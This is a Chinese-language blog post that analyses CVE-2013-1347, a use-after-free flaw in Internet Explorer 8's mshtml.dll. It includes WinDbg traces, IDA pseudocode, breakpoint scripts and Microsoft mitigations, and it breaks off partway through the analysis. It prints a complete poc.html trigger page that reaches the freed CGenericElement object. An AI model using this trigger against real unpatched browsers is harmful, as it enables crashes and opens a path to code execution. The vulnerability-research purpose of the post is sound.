---
layout:     post
title:      漏洞分析（五）：CVE-2013-1347
subtitle:   CVE-2013-1347：Microsoft IE CGenericElement UAF漏洞
date:       2021-09-06
author:     Hongtai S
header-img: img/13.jpg
catalog: true
tags:
    - 漏洞
    - 二进制
    - UAF
---
# CVE-2013-1347漏洞分析

## 一、漏洞信息

### 1. 漏洞简述

- 漏洞名称：Microsoft IE CGenericElement UAF漏洞
- 漏洞编号：CVE-2013-1347
- 漏洞类型：释放重引用（UAF）漏洞
- 漏洞影响：信息泄露
- CVSS评分：9.3（High）
- 利用难度：Medium
- 基础权限：不需要

### 2. 组件概述

JavaScript（JS）是一种具有函数优先的轻量级，解释型或即时编译型的编程语言，它作为开发Web页面的脚本语言而出名。

其主要功能有：

1.嵌入动态文本于HTML页面。
 
2.对浏览器事件做出响应。
 
3.读写HTML元素。 

4.在数据被提交到服务器之前验证数据。  

5.检测访客的浏览器信息。控制cookies，包括创建和修改等。 

6.基于Node.js技术进行服务器端编程。

语言组成：

1.ECMAScript，描述了该语言的语法和基本对象。

2.文档对象模型（DOM），描述处理网页内容的方法和接口。

3.浏览器对象模型（BOM），描述与浏览器进行交互的方法和接口。

### 4. 漏洞影响

受影响的操作系统：

Windows XP Service Pack 3; Windows XP Professional x64 Edition Service Pack 2; Windows Server 2003 Service Pack 2; Windows Server 2003 x64 Edition Service Pack 2; Windows Vista Service Pack 2; Windows Vista x64 Edition Service Pack 2; Windows Server 2008 for 32-bit Systems Service Pack 2; Windows Server 2008 for x64-based Systems Service Pack 2; Windows 7 for 32-bit Systems Service Pack 1; Windows 7 for x64-based Systems Service Pack 1; Windows Server 2008 R2 for x64-based Systems Service Pack 1; Windows Server 2008 R2 for Itanium-based Systems Service Pack 1

影响软件：

Microsoft Internet Explorer 8 


### 5. 解决方案

 - 应用 Microsoft Fix it 解决方案“CVE-2013-1347 MSHTML Shim Workaround”，以防止利用此问题

   请参阅[Microsoft 知识库文章2847204](https://support.microsoft.com/zh-CN/help/2847204) 

 - 将 Internet 和本地 Intranet 安全区域设置设置为“高”以阻止这些区域中的 ActiveX 控件和活动脚本

1. 在IE**工具**菜单上，单击**Internet 选项**。
2. 在Internet选项对话框中，单击**安全**选项卡，然后单击**Internet**。
3. 在**此区域的安全级别**下，将滑块移动到**高**。这将您访问的所有网站的安全级别设置为高。
4. 单击**本地内联网**。
5. 在此**区域的安全级别**下，将滑块移动到**高**。这将您访问的所有网站的安全级别设置为高。
6. 单击“**确定**”接受更改并返回 Internet Explorer。

[官方文档链接](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2013/ms13-038#internet-explorer-use-after-free-vulnerability---cve-2013-1347)  

## 二、漏洞分析

### 1. 基本信息

- 漏洞文件：mshtml.dll
- 漏洞函数：offsetParent
- 漏洞对象：CGenericElement

### 2. 背景知识

#### 释放重引用漏洞

释放重引用（Use After Free, UAF）漏洞，顾名思义就是引用到已经释放的内存，最终导致程序崩溃或任意代码执行的漏洞。

UAF漏洞在浏览器中最为常见，如IE，Chrome，FireFox等。

下面利用一段C代码简单描述UAF漏洞的过程：

```cpp,c
#include <stdio.h>
#define size 32 

int main(int argc, char **argv) { 

    char *buf1;
    char *buf2;

    buf1 = (char *) malloc(size);
    printf("buf1：0x%p\n", buf1);
    free(buf1);

    // 分配 buf2 去“占坑”buf1 的内存位置
    buf2 = (char *) malloc(size);
    printf("buf2：0x%p\n\n", buf2);

    // 对buf2进行内存清零
    memset(buf2, 0, size);
    printf("buf2：%d\n", *buf2);

    // 重引用已释放的buf1指针，但却导致buf2值被篡改
    printf("==== Use After Free ===\n");
    strncpy(buf1, "hack", 5);
    printf("buf2：%s\n\n", buf2);

    free(buf2);
    return 0;
}
```
运行后结果如图：

![1.png](https://i.loli.net/2021/09/06/Au1i2phzesYcLON.png)

首先向分配一块内存，由buf1记录分配地址，然后释放掉buf1，使之成为悬挂指针，然后再次分配内存，由buf2记录分配地址，这种情况下buf1与buf2指向相同的地址。现借助buf1这个悬挂指针向对应的内存区域写入字符串“hack”，进而导致buf2也被篡改为“hack”。

### 3. 详细分析

#### 1. 动态分析

##### 1. 利用页堆机制快速定位漏洞对象

启动IE浏览器，本次分析的IE版本为8.0.7601.17514，使用Windbg附加进程，然后将poc文件拖入浏览器中，此时会提示限制脚本或ActiveX插件，右键选择“允许组织的内容”，接着触发异常：

```cpp,c
0:018> g
(e98.ec4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=67370062 ebx=00313ef8 ecx=0032f7d8 edx=4486b540 esi=023dcb10 edi=00000000
eip=4486b540 esp=023dcae0 ebp=023dcafc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
4486b540 ??              ???
```
查看当前EIP所在的地址：

```cpp,c
0:005> !address 4486b540

Failed to map Heaps (error 80004005)
Usage:                  Free
Base Address:           06915000
End Address:            5fff0000
Region Size:            596db000
Type:                   00000000	
State:                  00010000	MEM_FREE
Protect:                00000001	PAGE_NOACCESS
```
可以看到EIP访问了不可访问的页面（PAGE_NOACCESS），继续查看函数调用栈：

```cpp,c
0:005> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
023dcadc 6752b694 67569b02 023dce2c 00313ef8 0x4486b540
023dcae0 67569b02 023dce2c 00313ef8 00000000 mshtml!CElement::Doc+0x7 (FPO: [0,0,0])
023dcafc 67569a0e 00313ef8 023dce2c 00313ef8 mshtml!CTreeNode::ComputeFormats+0xba
023dcda8 6757872a 00313ef8 00313ef8 023dcdc8 mshtml!CTreeNode::ComputeFormatsHelper+0x44
023dcdb8 675786ea 00313ef8 00313ef8 023dcdd8 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11
023dcdc8 675786d1 00313ef8 00313ef8 023dcde4 mshtml!CTreeNode::GetFancyFormatHelper+0xf
023dcdd8 674029cb 00313ef8 023dcdf4 67402ae6 mshtml!CTreeNode::GetFancyFormat+0x35
023dcde4 67402ae6 00000000 00313ef8 023dce04 mshtml!ISpanQualifier::GetFancyFormat+0x5a
023dcdf4 67402ac2 00000000 032822f8 023dce3c mshtml!SLayoutRun::HasInlineMbp+0x10
023dce04 67420f3d 00000000 00000000 032822f8 mshtml!SRunPointer::HasInlineMbp+0x56
023dce3c 673d4b64 023dce5b 00000000 00000000 mshtml!CLayoutBlock::GetIsEmptyContent+0xf2
023dce74 6761e223 023dcedf 023dcef3 0322fbe0 mshtml!CLayoutBlock::GetIsEmptyContent+0x3f
023dcec0 674104ee 0032f698 0322fb20 003138f0 mshtml!CBlockContainerBlock::BuildBlockContainer+0x250
023dcef8 67411290 0322fb20 00000000 0032f618 mshtml!CLayoutBlock::BuildBlock+0x1c1
023dcfbc 67412176 0122fb20 00325258 023dcfe3 mshtml!CCssDocumentLayout::GetPage+0x22a
023dd12c 6757566c 023dd2f0 023dd288 00000000 mshtml!CCssPageLayout::CalcSizeVirtual+0x254
023dd264 67585c6b 00325258 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8
023dd360 674493f1 00100000 023dd3b8 0323f428 mshtml!CLayout::DoLayout+0x11d
023dd374 6753e667 023dd3b8 023dd3b8 675740fd mshtml!CCssPageLayout::Notify+0x140
023dd380 675740fd 00000000 003137c0 00000000 mshtml!NotifyElement+0x41 (FPO: [0,0,1])
```

查看最近的返回地址之前的情况：

```cpp,c
0:005> ub 6752b694
mshtml!CElement::SecurityContext+0x29:
6752b688 90              nop
6752b689 90              nop
6752b68a 90              nop
6752b68b 90              nop
6752b68c 90              nop
mshtml!CElement::Doc:
6752b68d 8b01            mov     eax,dword ptr [ecx]
6752b68f 8b5070          mov     edx,dword ptr [eax+70h]
6752b692 ffd2            call    edx
```

这里很明显是一个虚函数的调用指令：结构体的地址位于ecx中，ecx存放了结构体的this指针，结构体的起始部分（[ecx]）存放了指向虚函数表的指针，通过设置偏移量能够获取任意一个虚函数的地址（[eax+70h]）。

为了方便调试，将程序开启页堆机制：

进入Windbg所在目录，按住shift键右键文件夹中空白处，点击在此处打开命令窗口，输入：

```cpp,c
gflags -i iexplore.exe +hpa
```
开启成功程序显示：

![2.PNG](https://i.loli.net/2021/09/06/NUGc2R9YrsAfXZv.png)

重新打开IE附加后打开poc文件，此时程序断在此处：

```cpp,c
0:018> g
(850.844): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=67a29100 ebx=093c1fb0 ecx=084a2fc8 edx=00000000 esi=0467cb70 edi=00000000
eip=676ab68d esp=0467cb44 ebp=0467cb5c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc:
676ab68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:084a2fc8=????????
```

这次程序断在了指令mov     eax,dword ptr [ecx]，也就是刚刚将虚函数表的起始地址赋值给eax的指令。

```cpp,c
0:005> !heap -p -a ecx
    address 084a2fc8 found in
    _DPH_HEAP_ROOT @ 51000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    6935e6c:          84a2000             2000
    730090b2 verifier!AVrfDebugPageHeapFree+0x000000c2
    76fc65f4 ntdll!RtlDebugFreeHeap+0x0000002f
    76f8a0aa ntdll!RtlpFreeHeap+0x0000005d
    76f565a6 ntdll!RtlFreeHeap+0x00000142
    7564bbe4 kernel32!HeapFree+0x00000014
    //这里引用了CGenericElement已经释放的对象！！！！
    675fc83a mshtml!CGenericElement::`scalar deleting destructor'+0x0000003d
    676b1daf mshtml!CBase::SubRelease+0x00000022
    676aa6b5 mshtml!CElement::PrivateRelease+0x0000002a
    676a7894 mshtml!PlainRelease+0x00000025
    676f3862 mshtml!PlainTrackerRelease+0x00000014
    6b03a735 jscript!VAR::Clear+0x0000005f
    6b056e46 jscript!GcContext::Reclaim+0x000000b6
    6b0543e9 jscript!GcContext::CollectCore+0x00000123
    6b0b83f0 jscript!JsCollectGarbage+0x0000001d
    6b04758c jscript!NameTbl::InvokeInternal+0x00000141
    6b044f84 jscript!VAR::InvokeByDispID+0x0000017f
    6b04e4c7 jscript!CScriptRuntime::Run+0x00002b80
    6b045d7d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce
    6b045cdb jscript!ScrFncObj::Call+0x0000008d
    6b045ef1 jscript!CSession::Execute+0x0000015f
    6b04620a jscript!COleScript::ExecutePendingScripts+0x000001bd
    6b04c3b9 jscript!COleScript::ParseScriptTextCore+0x000002a4
    6b04c1d1 jscript!COleScript::ParseScriptText+0x00000030
    6768f774 mshtml!CScriptCollection::ParseScriptText+0x00000218
    6768f58c mshtml!CScriptElement::CommitCode+0x000003c2
    6768f34f mshtml!CScriptElement::Execute+0x000000c6
    67672d52 mshtml!CHtmParse::Execute+0x0000004a
    6766c36a mshtml!CHtmPost::Broadcast+0x0000000f
    6766ceba mshtml!CHtmPost::Exec+0x000005f7
    6766e945 mshtml!CHtmPost::Run+0x00000015
    6766e8a9 mshtml!PostManExecute+0x000001fb
    6766e80e mshtml!PostManResume+0x000000f7
```

##### 2. 解析JavaScript代码

查看poc.html文件的源码：

```html
<!doctype html> <!-- required -->
<HTML>
<head>
</head>
<body>
<ttttt:whatever id="myanim"/><!-- required format -->
<script>
    f0=document.createElement('span');
	document.body.appendChild(f0);

	f1=document.createElement('span');
	document.body.appendChild(f1);

	f2=document.createElement('span');
	document.body.appendChild(f2);

	document.body.contentEditable="true";
	f2.appendChild(document.createElement('datalist')); //has to be a data list
	f1.appendChild(document.createElement('table'));    //has to be a table

	try{
	        f0.offsetParent=null;                       //required
	}catch(e){  }

	f2.innerHTML="";                                    //required
	f0.appendChild(document.createElement('hr'));       //required
	f1.innerHTML="";                                    //required
	CollectGarbage();
 </script>
</body>
</html>
```

首先创建了span元素：

```js
f0=document.createElement('span');
```

在WinDbg中查询相关的处理函数：

```cpp,c
0:005> x mshtml!*document*createElement*
67605e8d mshtml!CDocument::createElement = <no type information>
676b6ec0 mshtml!s_methdescCDocumentcreateElement = <no type information>
67605ee6 mshtml!CDocument::CreateElementHelper = <no type information>
```

首先分析第一个函数mshtml!CDocument::createElement

在Ida中打开mshtml.dll文件，查找这个函数，逐步跟进，将函数“抽丝剥茧”，找到最终的核心函数CreateElement，函数的调用关系如下：

```cpp,c
CDocument::createElement
	CDocument::CreateElementHelper
		CMarkup::CreateElement
			CreateElement
				C***Element::CreateElement  //****根据创建的元素决定
					CElement::CElement
```

查看CreateElement函数的汇编：

```cpp,c
.text:74D9D6DE                 mov     edi, edi
.text:74D9D6E0                 push    ebp
.text:74D9D6E1                 mov     ebp, esp
.text:74D9D6E3                 sub     esp, 10h
.text:74D9D6E6                 push    ebx
.text:74D9D6E7                 mov     ebx, [ebp+arg_8]
.text:74D9D6EA                 push    esi             ; struct CElement **
.text:74D9D6EB                 mov     [ebp+arg_8], 0
.text:74D9D6F2                 test    ebx, ebx
.text:74D9D6F4                 jz      loc_74D35D5D
.text:74D9D6FA
.text:74D9D6FA loc_74D9D6FA:                           ; CODE XREF: CreateElement(CHtmTag *,CElement * *,CDoc *,CMarkup *,int *,ulong)-6797C↑j
.text:74D9D6FA                 movzx   eax, byte ptr [edi+1]
.text:74D9D6FE                 shl     eax, 4
.text:74D9D701                 add     eax, offset ?g_atagdesc@@3QBVCTagDesc@@B ; CTagDesc const * const g_atagdesc
.text:74D9D706                 jz      loc_74EB4011
.text:74D9D70C                 mov     eax, [eax+8]
.text:74D9D70F                 lea     ecx, [ebp+arg_8]
.text:74D9D712                 push    ecx
.text:74D9D713                 push    edx
.text:74D9D714                 push    edi
.text:74D9D715                 call    eax
```

其中g_atagdesc是函数索引表，双击能够看到索引表的函数：

![3.PNG](https://i.loli.net/2021/09/06/aPI9bdJEHixqsU1.png)

在CMarkup::CreateElement函数下断点

重新加载，运行至此处：

```cpp,c
0:005> p
eax=0456c9c0 ebx=00000004 ecx=17850f30 edx=065c0680 esi=15c87638 edi=0456c918
eip=67605e23 esp=0456c8f0 ebp=0456c988 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMarkup::CreateElement+0x2df:
67605e23 e8b6780600      call    mshtml!CreateElement (6766d6de)

...

0:005> p
eax=000005b0 ebx=676a7be0 ecx=17850f30 edx=065c0680 esi=15c87638 edi=0456c918
eip=6766d701 esp=0456c8d0 ebp=0456c8e8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CreateElement+0x24:
6766d701 0520396c67      add     eax,offset mshtml!g_atagdesc (676c3920)
```

能够看到目前函数表的位置在676c3920，查看其附近的地址指向的函数：

```cpp,c
0:005> dds 676c3920
676c3920  674fa7a8 mshtml!`string'
676c3924  676c43c0 mshtml!g_pmiTextPlain+0x4
676c3928  678f826d mshtml!CTextElement::CreateElement
676c392c  00000001
676c3930  674fa7a8 mshtml!`string'
676c3934  676c4200 mshtml!s_hpcUnknown
676c3938  675f60a1 mshtml!CUnknownElement::CreateElement
676c393c  20000001
676c3940  676b0128 mshtml!g_tagascA2+0x8
676c3944  676c49d8 mshtml!g_entascsup2+0x14
676c3948  676813fe mshtml!CAnchorElement::CreateElement
676c394c  00000000
676c3950  676b0134 mshtml!g_tagascABBR3+0x8
676c3954  676c44e0 mshtml!g_pmiImagePlug+0xb4
676c3958  6768fe0e mshtml!CPhraseElement::CreateElement
676c395c  00000020
676c3960  676b0148 mshtml!g_tagascACRONYM4+0x8
676c3964  676c44e0 mshtml!g_pmiImagePlug+0xb4
676c3968  6768fe0e mshtml!CPhraseElement::CreateElement
676c396c  00000020
676c3970  676b0168 mshtml!g_tagascADDRESS5+0x8
676c3974  676c4ab0 mshtml!g_entascmicro+0x14
676c3978  675e622b mshtml!CBlockElement::CreateElement
676c397c  00080042
676c3980  676b0180 mshtml!g_tagascAPPLET6+0x8
676c3984  676c4dc8 mshtml!g_entascEuml203+0x14
676c3988  675e3d22 mshtml!CObjectElement::CreateElement
676c398c  08010001
676c3990  676b0198 mshtml!g_tagascAREA7+0x8
676c3994  676c4408 mshtml!g_pmiTextComponent+0x4
676c3998  6750839d mshtml!CAreaElement::CreateElement
676c399c  00000001
```

继续步过：

```cpp,c
0:005> p
eax=675e8f8c ebx=676a7be0 ecx=0456c8f8 edx=065c0680 esi=15c87638 edi=0456c918
eip=6766d715 esp=0456c8c4 ebp=0456c8e8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CreateElement+0x41:
6766d715 ffd0            call    eax {mshtml!CSpanElement::CreateElement (675e8f8c)}
```

能够看到这里调用了创建Span元素的函数，ida中查看该函数的代码：

```cpp,c
int __stdcall CSpanElement::CreateElement(struct CHtmTag *a1, struct CDoc *a2, struct CElement **a3)
{
  struct CElement *v3; // esi
  struct CElement *v4; // eax

  v3 = (struct CElement *)HeapAlloc(g_hProcessHeap, 8u, 0x28u);// 这里使用HealAlloc创建0x28大小内存
  if ( v3 )
  {
    CElement::CElement(91, a2);
    *(_DWORD *)v3 = &CSpanElement::`vftable';
    v4 = v3;
  }
  else
  {
    v4 = 0;
  }
  *a3 = v4;
  return v4 != 0 ? 0 : -2147024882;
}
```

CSpanElement::CreateElement函数先是分配了0x28大小的内存，然后调用CElement::CElement创建元素，并将数据写入堆空间。

通过设置以下断点能够查看创建了什么元素，以及为元素分配的内存状况：

```cpp,c
bu mshtml!CreateElement+0x41 "ln eax;g"
bu mshtml!CElement::CElement+0x1e ".echo '===CElement===';dd edi l(28/4);g"
```

在设置mshtml!CreateElement的断点时出现了两个同名函数：

```cpp,c
0:005> bu mshtml!CreateElement+0x41 "ln eax;g"
Matched: 6763141a mshtml!CreateElement = <no type information>
Matched: 6766d6de mshtml!CreateElement = <no type information>
Ambiguous symbol error at 'mshtml!CreateElement+0x41 "ln eax;g"'
```

查看函数代码，第二个函数是本次运行的函数：

```cpp,c
0:005> u 6766D701
mshtml!CreateElement+0x24:
6766d701 0520396c67      add     eax,offset mshtml!g_atagdesc (676c3920)
6766d706 0f8405691100    je      mshtml!CreateElement+0x2b (67784011)
6766d70c 8b4008          mov     eax,dword ptr [eax+8]
6766d70f 8d4d10          lea     ecx,[ebp+10h]
6766d712 51              push    ecx
6766d713 52              push    edx
6766d714 57              push    edi
6766d715 ffd0            call    eax
```

设置断点：

```cpp,c
0:005> bu 6766d6de+37 "ln eax;g"
0:005> bu mshtml!CElement::CElement+0x1e ".echo '===CElement===';dd edi l(28/4);g"
0:005> bl
 0 e 6766d701     0001 (0001)  0:**** mshtml!CreateElement+0x24 "ln eax;g"
 1 e 67669ff1     0001 (0001)  0:**** mshtml!CElement::CElement+0x1e ".echo '===CElement===';dd edi l(28/4);g"
```

设置断点后重新运行，结果如下：

```cpp,c
'===CElement==='
081eefd8  674f5570 00000001 00000008 00000000
081eefe8  00000000 00000000 00000000 00000000
081eeff8  00000000 00000000
(676377d2)   mshtml!CCommentElement::CreateElement   |  (67637880)   mshtml!`string'
Exact matches:
    mshtml!CCommentElement::CreateElement = <no type information>
'===CElement==='
08248fc8  674f5570 00000001 00000008 00000000
08248fd8  00000000 00000000 00000000 00000000
08248fe8  00000000 00000000
(676377d2)   mshtml!CCommentElement::CreateElement   |  (67637880)   mshtml!`string'
Exact matches:
    mshtml!CCommentElement::CreateElement = <no type information>
'===CElement==='
04764fc8  674f5570 00000001 00000008 00000000
04764fd8  00000000 00000000 00000000 00000000
04764fe8  00000000 00000000
(67631547)   mshtml!CHtmlElement::CreateElement   |  (67631598)   mshtml!CHtmlElement::`vftable'
Exact matches:
    mshtml!CHtmlElement::CreateElement = <no type information>
'===CElement==='
087c8fd8  674f5570 00000001 00000008 00000000
087c8fe8  00000000 00000000 00000000 00000000
087c8ff8  00000000 00000000
(6763181d)   mshtml!CHeadElement::CreateElement   |  (67631868)   mshtml!CHeadElement::`vftable'
Exact matches:
    mshtml!CHeadElement::CreateElement = <no type information>
'===CElement==='
088c0fd8  674f5570 00000001 00000008 00000000
088c0fe8  00000000 00000000 00000000 00000000
088c0ff8  00000000 00000000
'===CElement==='
06602fd0  674f5570 00000001 00000008 00000000
06602fe0  00000000 00000000 00000000 00000000
06602ff0  00000000 00000000
(67630bba)   mshtml!CBodyElement::CreateElement   |  (67630c08)   mshtml!CBodyElement::CBodyElement
Exact matches:
    mshtml!CBodyElement::CreateElement = <no type information>
'===CElement==='
056e4fd0  674f5570 00000001 00000008 00000000
056e4fe0  00000000 00000000 00000000 00000000
056e4ff0  00000000 00000000
'===CElement==='
0822cfd0  674f5570 00000001 00000008 00000000
0822cfe0  00000000 00000000 00000000 00000000
0822cff0  00000000 00000000
(676377d2)   mshtml!CCommentElement::CreateElement   |  (67637880)   mshtml!`string'
Exact matches:
    mshtml!CCommentElement::CreateElement = <no type information>
'===CElement==='
06698fc8  674f5570 00000001 00000008 00000000
06698fd8  00000000 00000000 00000000 00000000
06698fe8  00000000 00000000
(6768f96d)   mshtml!CScriptElement::CreateElement   |  (6768f9b7)   mshtml!CScriptElement::CScriptElement
Exact matches:
    mshtml!CScriptElement::CreateElement = <no type information>
'===CElement==='
080a0f98  674f5570 00000001 00000008 00000000
080a0fa8  00000000 00000000 00000000 00000000
080a0fb8  00000000 00000000
ModLoad: 6aea0000 6af52000   C:\Windows\System32\jscript.dll
(675e8f8c)   mshtml!CSpanElement::CreateElement   |  (675e8fd8)   mshtml!CSpanElement::`vftable'
Exact matches:
    mshtml!CSpanElement::CreateElement = <no type information>
(675e8f8c)   mshtml!CSpanElement::CreateElement   |  (675e8fd8)   mshtml!CSpanElement::`vftable'
Exact matches:
    mshtml!CSpanElement::CreateElement = <no type information>
'===CElement==='
08852fd8  674f5570 00000001 00000008 00000000
08852fe8  00000000 00000000 00000000 00000000
08852ff8  00000000 00000000
(675e8f8c)   mshtml!CSpanElement::CreateElement   |  (675e8fd8)   mshtml!CSpanElement::`vftable'
Exact matches:
    mshtml!CSpanElement::CreateElement = <no type information>
'===CElement==='
05316fd8  674f5570 00000001 00000008 00000000
05316fe8  00000000 00000000 00000000 00000000
05316ff8  00000000 00000000
(675e8f8c)   mshtml!CSpanElement::CreateElement   |  (675e8fd8)   mshtml!CSpanElement::`vftable'
Exact matches:
    mshtml!CSpanElement::CreateElement = <no type information>
'===CElement==='
084f1fd8  674f5570 00000001 00000008 00000000
084f1fe8  00000000 00000000 00000000 00000000
084f1ff8  00000000 00000000
(675fc4de)   mshtml!CGenericElement::CreateElement   |  (675fc523)   mshtml!CGenericElement::CGenericElement
Exact matches:
    mshtml!CGenericElement::CreateElement = <no type information>
'===CElement==='
06accfc8  674f5570 00000001 00000008 00000000
06accfd8  00000000 00000000 00000000 00000000
06accfe8  00000000 00000000
(675da55d)   mshtml!CTable::CreateElement   |  (675da59e)   mshtml!CTable::CTable
Exact matches:
    mshtml!CTable::CreateElement = <no type information>
'===CElement==='
08509fb8  674f5570 00000001 00000008 00000000
08509fc8  00000000 00000000 00000000 00000000
08509fd8  00000000 00000000
(675cd66d)   mshtml!CHRElement::CreateElement   |  (675cd6c3)   mshtml!CHRElement::ApplyDefaultFormat
Exact matches:
    mshtml!CHRElement::CreateElement = <no type information>
'===CElement==='
08e36fd8  674f5570 00000001 00000008 00000000
08e36fe8  00000000 00000000 00000000 00000000
08e36ff8  00000000 00000000

```

至此，poc文件中的JS脚本的创建元素代码分析完成，接下来分析在DOM树插入元素的代码：

```js
document.body.appendChild(f0);
```
仍然使用windbg查询相关函数：

```cpp,c
0:005> x mshtml!*appendChild*
67605acf mshtml!CElement::appendChild = <no type information>
67851590 mshtml!CAttribute::appendChild = <no type information>
678509f4 mshtml!CDOMTextNode::appendChild = <no type information>
6773d1d8 mshtml!s_methdescCAttributeappendChild = <no type information>
676bd720 mshtml!s_methdescCElementappendChild = <no type information>
6760d65e mshtml!CDocument::appendChild = <no type information>
```
先针对mshtml!CElement::appendChild函数进行分析，在Ida中查看函数调用情况：

```cpp,c
CElement::appendChild
	CElement::insertBefore
		CElement::InsertBeforeHelper
			CElement::GetDOMInsertPosition
			sub_74D359BA
				CDoc::InsertElement
					CMarkup::InsertElementInternal
```

使用Ida查看CMarkup::InsertElementInternal源码：

```cpp,c
v23 = CTreePosGap::Branch(v22); // 目标分支，body节点元素，也是Span元素将要插入的地方
while ( 1 )
{
  v69 = v23;
  if ( CMarkup::SearchBranchForNodeInStory(v24, v23, v65) )
    v74 = 1;
  v25 = (CTreeNode *)HeapAlloc(g_hProcessHeap, 8u, 0x4Cu);// 创建大小为0x4C的内存
  if ( v25 )
  {
    v27 = CTreeNode::CTreeNode(v25, v69, 0, (int)v65);// 创建DOM树节点，申请的内存地址注作为this指针
    v78 = v27;
  }
```

动态调试步过函数CTreeNode::CTreeNode后查看CTreeNode地址：

```cpp,c
0:005> p
eax=095f7fb0 ebx=00000000 ecx=095f7fb0 edx=00000000 esi=045aced8 edi=08969fd8
eip=675eb0aa esp=045ace10 ebp=045acea8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CMarkup::InsertElementInternal+0x238:
675eb0aa e80a970c00      call    mshtml!CTreeNode::CTreeNode (676b47b9)
0:005> p
eax=095f7fb0 ebx=00000000 ecx=095f7fb0 edx=00000008 esi=045aced8 edi=08969fd8
eip=675eb0af esp=045ace18 ebp=045acea8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CMarkup::InsertElementInternal+0x23d:
675eb0af 8bf0            mov     esi,eax
0:005> dd eax l1
095f7fb0  08969fd8
0:005> dps poi(eax) l1
08969fd8  675e8fd8 mshtml!CSpanElement::`vftable'
```

因此在指令CMarkup::InsertElementInternal+0x23d处下段，即可得到对象CTreeNode地址：

```cpp,c
bu mshtml!CMarkup::InsertElementInternal+1de ".echo '===CTreeNode===';dd eax l1;dps poi(eax) l1;gc"
0:025> bl
 4 e 675eb0af     0001 (0001)  0:**** mshtml!CMarkup::InsertElementInternal+0x23d ".echo '===CTreeNode===';dd eax l1;dps poi(eax) l1;gc"
```

运行后能够得到以下结果：

```cpp,c
0:025> g
'===CTreeNode==='
2c08cfb0  2bfb2fd8
2bfb2fd8  675e8fd8 mshtml!CSpanElement::`vftable'
'===CTreeNode==='
2afdefb0  3284afd8
3284afd8  675e8fd8 mshtml!CSpanElement::`vftable'
'===CTreeNode==='
2ca0efb0  20006fd8
20006fd8  675e8fd8 mshtml!CSpanElement::`vftable'
'===CTreeNode==='
2aca6fb0  1781cfc8
1781cfc8  675fc590 mshtml!CGenericElement::`vftable'
'===CTreeNode==='
2ac18fb0  3299afb8
3299afb8  674f6488 mshtml!CTable::`vftable'
'===CTreeNode==='
08ec7fb0  12daefd8
12daefd8  674f9250 mshtml!CHRElement::`vftable'
```

结合之前创建元素的断点方式，能够查看添加的元素CElement以及CTreeNode对象的地址及其内容：

```cpp,c
bu mshtml!CMarkup::InsertElementInternal+1de ".echo '===CTreeNode===';dd eax l1;dps poi(eax) l1;g"
bu 6417d6de+37 "ln eax;g"  // 此处地址不固定
bu mshtml!CElement::CElement+0x1e ".echo '===CElement===';dd edi l(28/4);g"
```
重新运行后结果如下：

```cpp,c
######## 创建 f0(span)元素 ########
'===CElement==='
07851fd8  69e55570 00000001 00000008 00000000
07851fe8  00000000 00000000 00000000 00000000
07851ff8  00000000 00000000
'===CTreeNode==='
0597cfb0  07851fd8
07851fd8  69f48fd8 mshtml!CSpanElement::`vftable'

######## 创建 f1(span)元素 ########
'===CElement==='
091e1fd8  69e55570 00000001 00000008 00000000
091e1fe8  00000000 00000000 00000000 00000000
091e1ff8  00000000 00000000
'===CTreeNode==='
0887cfb0  091e1fd8
091e1fd8  69f48fd8 mshtml!CSpanElement::`vftable'

######## 创建 f2(span)元素 ########
'===CElement==='
08128fd8  69e55570 00000001 00000008 00000000
08128fe8  00000000 00000000 00000000 00000000
08128ff8  00000000 00000000
'===CTreeNode==='
0844cfb0  08128fd8
08128fd8  69f48fd8 mshtml!CSpanElement::`vftable'

######## 在f2中添加datalist元素 ########
'===CElement==='
03b23fc8  69e55570 00000001 00000008 00000000
03b23fd8  00000000 00000000 00000000 00000000
03b23fe8  00000000 00000000
'===CTreeNode==='
09406fb0  03b23fc8
03b23fc8  69f5c590 mshtml!CGenericElement::`vftable'
// 漏洞对象CGenericElement就是在f2添加datalist时创建的

######## 在f1中添加table元素 ########
'===CElement==='
0976efb8  69e55570 00000001 00000008 00000000
0976efc8  00000000 00000000 00000000 00000000
0976efd8  00000000 00000000
'===CTreeNode==='
08dbafb0  0976efb8
0976efb8  69e56488 mshtml!CTable::`vftable'

######## 在f1中添加hr元素 ########
'===CElement==='
09209fd8  69e55570 00000001 00000008 00000000
09209fe8  00000000 00000000 00000000 00000000
09209ff8  00000000 00000000
'===CTreeNode==='
0829ffb0  09209fd8
09209fd8  69e59250 mshtml!CHRElement::`vftable'

```
至此，元素的创建以及插入至DOM树的过程已分析完毕。

看这一代码：

```js
f0.offsetParent=null;
```

这句代码的意思是搜索f0元素的祖先并将其置空，将f0与body断绝父子关系，并非清空body元素。

通过Windbg搜索相关函数：

```cpp,c
0:005> x mshtml!*offsetParent*
69e8128e mshtml!CDisplayRequestGetOffsetParent::~CDisplayRequestGetOffsetParent = <no type information>
69e811ca mshtml!CDisplayRequestGetOffsetParent::CDisplayRequestGetOffsetParent = <no type information>
69e816cd mshtml!CDisplayBox::IsOffsetParent = <no type information>
69e81709 mshtml!CDisplayBox::FindOffsetParent = <no type information>
